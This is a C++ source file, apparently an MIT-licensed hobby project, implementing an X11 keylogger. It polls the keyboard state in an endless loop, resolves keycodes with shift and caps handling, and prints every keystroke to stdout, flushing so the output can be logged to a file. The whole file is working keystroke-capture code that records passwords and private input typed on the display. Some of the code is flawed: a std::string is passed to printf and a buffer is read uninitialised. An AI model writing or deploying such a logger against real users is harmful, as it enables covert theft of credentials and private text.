/*
  
MIT License

Copyright (c) 2024 Androsh7

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

*/

#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/keysym.h>
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <iostream>

#define charlistlen 47
const char charkeylist[charlistlen] =    { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', ';', '=', ',', '-', '.', '/', '`' ,'[', '\\', ']', '\''};
const char altcharkeylist[charlistlen] = { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ':', '+', '<', '_', '>', '?', '~' , '{', '|' , '}', '\"'};

char caps_char(char find_char) {
        for (int i = 0; i < charlistlen; i++) {
                if (find_char == charkeylist[i]) {
                        return altcharkeylist[i];
                }
        }
        return '\0';
}

int get_key_state(char* keys, char* prev_keys, int key_num) {
        int byteIndex = key_num / 8;
        int bitIndex = key_num % 8;
        bool current_state = keys[byteIndex] & (1 << bitIndex);
        bool prev_state = prev_keys[byteIndex] & (1 << bitIndex);
        if (current_state && !prev_state) return 1; // key pressed
        if (current_state && prev_state) return 2; // key held
        if (!current_state && prev_state) return 3; // key released
        return 0; // key not pressed
}

int main() {
        Display *display = XOpenDisplay(NULL);
        if (display == NULL) {
                fprintf(stderr, "Unable to open display\n");
                return 1;
        }

        char raw_keys[32];
        char prev_raw_keys[32];

        int min_keycode, max_keycode, keysyms;

        bool shift = false;
        bool caps = false;

        // Gets mapping of keycodes
        XDisplayKeycodes(display, &min_keycode, &max_keycode);
        KeySym *mapping = XGetKeyboardMapping(display, min_keycode, max_keycode - min_keycode + 1, &keysyms);

        while (True)
        {
                // read key states
                XQueryKeymap(display, raw_keys);

                // check L_shift status
                if (get_key_state(raw_keys, prev_raw_keys, 50) == 1) {
                        printf("L_Shift Pressed\n");
                        shift = true;
                } else if (shift && get_key_state(raw_keys, prev_raw_keys, 50) == 0) {
                        shift = false;
                }
                // check R_shift status
                if (get_key_state(raw_keys, prev_raw_keys, 62) == 1) {
                        printf("R_Shift Pressed\n");
                        shift = true;
                } else if (shift && get_key_state(raw_keys, prev_raw_keys, 62) == 0) {
                        shift = false;
                }
                // check caps status
                if (get_key_state(raw_keys, prev_raw_keys, 66) == 1) {
                        printf("CAPS LOCK\n");
                        caps = !caps;
                }

                bool capitalization = caps ^ shift; // capitalization

                
                // writes key states to keymap
                for (int i = 0; i < 256; i++) {
                        int byteIndex = i / 8;
                        int bitIndex = i % 8;

                        // skip checking L_shift(50), R_shift(62), and caps lock(66)
                        if (i == 66 || i == 50 || i == 62) { continue; }
                        
                        // Key press
                        if (raw_keys[byteIndex] & (1 << bitIndex) && !(prev_raw_keys[byteIndex] & (1 << bitIndex))) {

                                for (int j = 0; j < keysyms; j++) {
                                        KeySym keypress = mapping[(i - min_keycode) * keysyms + j];

                                        if (keypress != NoSymbol) {
                                                std::string key_str = XKeysymToString(keypress);

                                                // gets capitalized chars
                                                if (key_str.length() == 1 && capitalization) {
                                                        char temp_char = caps_char(key_str[0]);
                                                        key_str = "";
                                                        key_str += temp_char;
                                                }

                                                printf("%s", key_str);
                                                                                                
                                                // Important to flush to write in a file
                                                // Can alternatively disable buffering in stdout
                                                fflush(stdout);
                                                break;
                                        }  
                                }
                        }

                        // Key held
                        else if (raw_keys[byteIndex] & (1 << bitIndex) && (prev_raw_keys[byteIndex] & (1 << bitIndex))) {

                        }

                        // Key Release
                        else if (raw_keys[byteIndex] & (1 << bitIndex) && !(prev_raw_keys[byteIndex] & (1 << bitIndex))) {

                        }
                }
                for (int i = 0; i < 32; i++) {
                        prev_raw_keys[i] = raw_keys[i];
                        raw_keys[i] = '\0';
                }

        }
        XFree(mapping);
        XCloseDisplay(display);
        return 0;
}
